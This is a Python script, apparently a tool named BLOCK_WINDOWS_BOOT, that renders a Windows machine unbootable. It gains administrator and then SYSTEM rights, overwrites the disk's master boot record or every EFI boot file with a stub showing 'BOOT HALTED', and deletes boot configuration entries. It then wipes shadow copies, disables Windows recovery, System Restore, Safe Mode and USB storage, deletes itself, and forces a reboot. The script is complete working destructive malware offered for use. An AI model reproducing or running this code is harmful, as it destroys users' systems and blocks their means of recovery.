# CREATOR 
# GitHub https://github.com/cppandpython
# NAME: Vladislav 
# SURNAME: Khudash  
# AGE: 17

# DATE: 02.03.2026
# APP: BLOCK_WINDOWS_BOOT
# TYPE: BLOCK_OS
# VERSION: LATEST
# PLATFORM: win32




MSG = '[ WINBOOT ]\nBOOT HALTED'




import os
import winreg as reg
from re import compile as re
from locale import getencoding
from subprocess import run as sp_run, DEVNULL
from sys import exit as _exit, argv, platform, executable
from ctypes import byref, c_char, c_size_t, windll, wintypes


__file__ = os.path.abspath(argv[0])
IS_EXE = __file__.endswith('.exe')


if platform != 'win32':
    print(f'DO NOT SUPPORT ({platform})')
    _exit(1)


def getenc():
    cp = f'cp{windll.kernel32.GetConsoleOutputCP()}'

    try:
        'cp'.encode(cp)
        return cp
    except:
        return getencoding()
    

def sync():
    windll.kernel32.SetSystemFileCacheSize(c_size_t(0), c_size_t(0), wintypes.DWORD(0))
    

def writef(dev, data):
    kernel32 = windll.kernel32
 
    handle = kernel32.CreateFileW(
        dev,
        0x40000000,                
        0x00000001 | 0x00000002,   
        None,
        3,                         
        0x80 | 0x20000000,         
        None
    )
        
    if handle == wintypes.HANDLE(-1).value:
        return False
    
    kernel32.SetFilePointer(handle, 0, None, 0)

    size = len(data)

    success = kernel32.WriteFile(
        handle,
        (c_char * size).from_buffer(data),
        size,
        byref(wintypes.DWORD()),
        None
    )
 
    if not success:
        kernel32.CloseHandle(handle)
        return False

    kernel32.FlushFileBuffers(handle)
    kernel32.CloseHandle(handle)

    return True


def is_bios():
    fw = wintypes.DWORD()
    windll.kernel32.GetFirmwareType(byref(fw))

    return fw.value == 1


def reg_set(d):
    key = d['key']
    name = d['name']
    value = d['value']

    try:
        with reg.CreateKeyEx(reg.HKEY_LOCAL_MACHINE, key, access=reg.KEY_WRITE) as k:
            reg.SetValueEx(
                k, 
                name, 
                0, 
                reg.REG_DWORD if isinstance(value, int) else reg.REG_SZ, 
                value
            )
    except:
        return


def cmd(c, out=False, _new=False):
    try:
        if out:
            return sp_run(c, capture_output=True, text=True, encoding=getenc(), timeout=30).stdout

        return sp_run(c, stdout=DEVNULL, stderr=DEVNULL, start_new_session=_new, timeout=30).returncode
    except:
        return '' if out else -1


def get_admin():
    if windll.shell32.IsUserAnAdmin() != 0:
        return
    
    windll.shell32.ShellExecuteW(
        None, 
        'runas', 
        *((__file__, None) if IS_EXE else (executable, __file__)), 
        None, 
        0
    )
    os._exit(0)


def get_SYSTEM():
    if '-s' in argv:
        return
    
    TASK_NAME = 'winsys'
    
    for n in (
        [
            'schtasks', 
            '/create', '/f',
            '/tn', TASK_NAME,        
            '/tr', f'{__file__} -s' if IS_EXE else f'{executable} {__file__} -s',               
            '/sc', 'onstart', 
            '/ru', 'SYSTEM'
        ],
        ['schtasks', '/run', '/tn', TASK_NAME],
        ['schtasks', '/delete', '/f', '/tn', TASK_NAME]
    ):
        cmd(n)
    os._exit(0)


def make_mbr():
    '''
Returns a 16-bit Master Boot Record (MBR) binary.

This MBR was assembled using NASM from the following source:


BITS 16
ORG 0x7C00


start:
    cli
    xor ax, ax
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00
    sti
    mov si, msg


output:
    lodsb
    cmp al, 0
    je loop
    mov ah, 0x0E
    mov bh, 0x00
    int 0x10
    jmp output


loop:
    cli
    hlt


msg db 'here is (MSG)', 0
dw 0xAA55
    '''

    SIZE = 512

    template = b'\xfa1\xc0\x8e\xd8\x8e\xc0\x8e\xd0\xbc\x00|\xfb\xbe\x1f|\xac<\x00t\x08\xb4\x0e\xb7\x00\xcd\x10\xeb\xf3\xfa\xf4'
    
    template_len = len(template)
    msg_len = len(MSG)
    end_msg_len = template_len + msg_len
    
    mbr = bytearray(SIZE)
    ptr = memoryview(mbr)

    ptr[0:template_len] = template
    ptr[template_len:end_msg_len] = MSG
    ptr[end_msg_len] = 0
    ptr[510] = 0x55
    ptr[511] = 0xAA

    return ptr


def make_efi():
    '''
Returns a 64-bit UEFI application binary.

This UEFI was assembled using NASM from the following source:


bits 64
default rel


EFI_SUCCESS                       equ 0
EFI_LOAD_ERROR                    equ 0x8000000000000001
EFI_INVALID_PARAMETER             equ 0x8000000000000002
EFI_UNSUPPORTED                   equ 0x8000000000000003
EFI_BAD_BUFFER_SIZE               equ 0x8000000000000004
EFI_BUFFER_TOO_SMALL              equ 0x8000000000000005
EFI_NOT_READY                     equ 0x8000000000000006
EFI_NOT_FOUND                     equ 0x8000000000000014
EFI_SYSTEM_TABLE_SIGNATURE        equ 0x5453595320494249


%macro UINTN 0
    RESQ 1
    alignb 8
%endmacro

%macro UINT32 0
    RESD 1
    alignb 4
%endmacro

%macro UINT64 0
    RESQ 1
    alignb 8
%endmacro

%macro EFI_HANDLE 0
    RESQ 1
    alignb 8
%endmacro

%macro POINTER 0
    RESQ 1
    alignb 8
%endmacro


struc EFI_TABLE_HEADER
    .Signature  UINT64
    .Revision   UINT32
    .HeaderSize UINT32
    .CRC32      UINT32
    .Reserved   UINT32
endstruc

struc EFI_SYSTEM_TABLE
    .Hdr                  RESB EFI_TABLE_HEADER_size
    .FirmwareVendor       POINTER
    .FirmwareRevision     UINT32
    .ConsoleInHandle      EFI_HANDLE
    .ConIn                POINTER
    .ConsoleOutHandle     EFI_HANDLE
    .ConOut               POINTER
    .StandardErrorHandle  EFI_HANDLE
    .StdErr               POINTER
    .RuntimeServices      POINTER
    .BootServices         POINTER
    .NumberOfTableEntries UINTN
    .ConfigurationTable   POINTER
endstruc


struc EFI_OUTPUT
    .reset      POINTER      
    .print      POINTER      
endstruc


section .text
global _start
_start:
    mov rcx, [rdx + EFI_SYSTEM_TABLE.ConOut]
    mov rdx, MSG
    call [rcx + EFI_OUTPUT.print]
    jmp $


section .data
MSG db __utf16__ `here is (MSG)`
    ''' 

    SIZE = 3584
    OFFSET = 2049

    template = b'MZx\x00\x01\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00x\x00\x00\x00\x0e\x1f\xba\x0e\x00\xb4\t\xcd!\xb8\x01L\xcd!This program cannot be run in DOS mode.$\x00\x00PE\x00\x00d\x86\x03\x00\xe72\xa4i\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x00"\x00\x0b\x02\x0e\x00\x00\x02\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00\x00\x00\x00@\x01\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\n\x00`\x81\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x000\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00.text\x00\x00\x00\x13\x00\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00 \x00\x00`.data\x00\x00\x00\xd0\x07\x00\x00\x00 \x00\x00\x00\x08\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\xc0.reloc\x00\x00\x0c\x00\x00\x00\x000\x00\x00\x00\x02\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00B\x00\x00\x00\x00\x00\x00\x00\x00H\x8bJ@H\xba\x00 \x00@\x01\x00\x00\x00\xffQ\x08\xeb\xfe\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc\xcc'

    efi = bytearray(SIZE)
    ptr = memoryview(efi)

    msg = MSG + bytes(OFFSET - len(MSG))

    template_len = len(template)
    msg_len = len(msg)
    end_msg_len = template_len + msg_len

    ptr[0:template_len] = template
    ptr[template_len:end_msg_len] = msg
    ptr[end_msg_len:] = b'\x10\x00\x00\x0c\x00\x00\x00\x06\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    return ptr


def disk_bios():
    SIGN = b'\x55\xAA'

    dev = None

    for n in range(3):
        drive = f'\\\\.\\PhysicalDrive{n}'

        try:
            with open(drive, 'rb') as f:
                f.seek(0, os.SEEK_SET)
                sector = memoryview(f.read(512))

                if (len(sector) == 512) and (sector[510:512] == SIGN):
                    dev = drive
                    break
        except:
            continue
    
    return dev


def bootefi(esp):
    boot = []

    for root, _, files in os.walk(esp):
        for n in files:
            if n.endswith('.efi'):
                boot.append(os.path.join(root, n))

    return boot   


def ESP(disk, efi):
    written = False

    boot = bootefi(disk)

    if not boot:
        return written
    
    for n in boot:
        try:
            cmd(['takeown', '/f', n])
            cmd(['icacls', n, '/grant', 'SYSTEM:F'])
            cmd(['attrib', '-r', '-s', '-h', n])

            with open(n, 'wb') as f:
                f.seek(0, os.SEEK_SET)
                f.write(efi)
                f.flush()
                os.fsync(f.fileno())
            written = True
        except:
            continue

    return written


def BIOS():
    mbr = make_mbr()
    disk = disk_bios()

    if disk is None:
        DEFAULT()
        return

    if not writef(disk, mbr):
        DEFAULT()
        return
    
    sync()
    

def UEFI():
    efi = make_efi()
    written = False

    for n in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        disk = f'{n}:\\'

        if os.path.exists(disk):
            continue

        tom = f'{n}:'
        break
    else:
        DEFAULT()
        return

    for n in cmd(['mountvol'], out=True).splitlines():
        n = n.strip()

        if not n.startswith('\\\\?\\'):
            continue

        cmd(['mountvol', tom, n])

        if not (os.path.exists(os.path.join(disk, 'Boot')) or os.path.exists(os.path.join(disk, 'EFI'))):
            cmd(['mountvol', tom, '/d'])
            continue

        written = ESP(disk, efi)

        cmd(['mountvol', tom, '/d'])

    if not written:
        DEFAULT()
        return

    sync()


def BCD():
    records = {'{dbgsettings}', '{memdiag}', '{badmemory}', '{hypervisorsettings}', '{emssettings}'}

    exp = re(r'({\S+})')
    flag = False

    for n in cmd(['bcdedit', '/enum', 'all'], out=True).splitlines():
        if flag:
            guid = exp.search(n)

            if guid:
                records.add(guid.group(1))
                flag = False

        if n.startswith('-----'):
            flag = True

    for n in [
        '{bootmgr}',
        '{current}',
        '{globalsettings}',
        '{bootloadersettings}',
        '{resumeloadersettings}'
    ]:
        records.discard(n)

    for n in records:cmd(['bcdedit', '/delete', n, '/f'])

    for n in (
        ['bcdedit', '/timeout', '0'],
        ['bcdedit', '/default', '{current}'],
        ['bcdedit', '/set', '{bootmgr}', 'bootmenupolicy', 'Standard'],
        ['bcdedit', '/set', '{bootmgr}', 'bootmenu', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'displaybootmenu', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'advancedoptions', 'off'],
        ['bcdedit', '/set', '{bootmgr}', 'bootems', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'bootsequence', '{current}'],
        ['bcdedit', '/set', '{bootmgr}', 'toolsdisplayorder', '{current}'],
        ['bcdedit', '/set', '{bootmgr}', 'recoveryenabled', 'no'],
        ['bcdedit', '/set', '{bootmgr}', 'nointegritychecks', 'yes'],
        ['bcdedit', '/set', '{bootmgr}', 'ems', 'off'],
        ['bcdedit', '/set', '{bootmgr}', 'pxesoftreboot', 'no'],
        ['bcdedit', '/set', '{current}', 'quietboot', 'yes'],
        ['bcdedit', '/deletevalue', '{current}', 'safeboot'],
        ['bcdedit', '/deletevalue', '{current}', 'safebootalternateshell'],
        ['bcdedit', '/deletevalue', '{current}', 'recoverysequence'],
        ['bcdedit', '/deletevalue', '{current}', 'bootstatuspolicy'],
        ['bcdedit', '/set', '{current}', 'testsigning', 'off'],
        ['bcdedit', '/set', '{current}', 'bootlog', 'no'],
        ['reg', 'delete', 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot', '/f'],
        ['vssadmin', 'delete', 'shadows', '/all', '/quiet'],
        ['reagentc', '/disable']
    ):
        cmd(n)
    
    for n in [
        {
            'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
            'name': 'BootShell',
            'value': ''
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\CrashControl',
            'name': 'AutoReboot',
            'value': 0
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
            'name': 'BootStatusPolicy',
            'value': 1
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\Session Manager',
            'name': 'AutoChkTimeout',
            'value': 0
        },
        {
            'key': r'SOFTWARE\Policies\Microsoft\Windows\RemovableStorageDevices',
            'name': 'Deny_All',
            'value': 1
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Services\USBSTOR',
            'name': 'Start',
            'value': 4  
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\WindowsRE',
            'name': 'Enabled',
            'value': 0
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\WindowsRE',
            'name': 'AutoRecoveryEnabled',
            'value': 0
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\WindowsRE',
            'name': 'BootRecoveryEnabled',
            'value': 0
        },
        {
            'key': r'SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore',
            'name': 'DisableSR',
            'value': 1 
        },
        {
            'key': r'SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore',
            'name': 'DisableSR',
            'value': 1  
        },
        {
            'key': r'SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore',
            'name': 'DisableSRUI',
            'value': 1
        },
        {
            'key': r'SYSTEM\CurrentControlSet\Control\CrashControl',
            'name': 'LogEvent',
            'value': 0 
        }
    ]:
        reg_set(n)

        
def DEFAULT():
    msg = MSG.decode('ASCII' if IS_BIOS else 'UTF-16LE').replace('"', '\"').replace('\n', ' ').replace('\t', '    ')[:255]

    cmd(['bcdedit', '/set', '{current}', 'path', msg])
    BCD()
    sync()


def main():
    global MSG, IS_BIOS

    IS_BIOS = is_bios()

    if not isinstance(MSG, str):
        raise TypeError('(MSG) must be str')
    
    if not IS_BIOS:
        if len(MSG) > 1000:
            raise OverflowError('(MSG) length > 1000')
        
        MSG = MSG.encode('UTF-16LE')
    else:
        if not MSG.isascii():
            raise ValueError(f'(MSG) must be ASCII')
        
        MSG = MSG.encode('ASCII')

        if len(MSG) > 478:
            raise OverflowError('(MSG) length > 478')

    get_admin()
    get_SYSTEM()

    (BIOS if IS_BIOS else UEFI)()

    if os.path.isfile(__file__): 
        try:
            os.remove(__file__)
        except: ...

    cmd(['shutdown', '/r', '/f', '/t', '0'])
    _exit(0)


if __name__ == '__main__': main()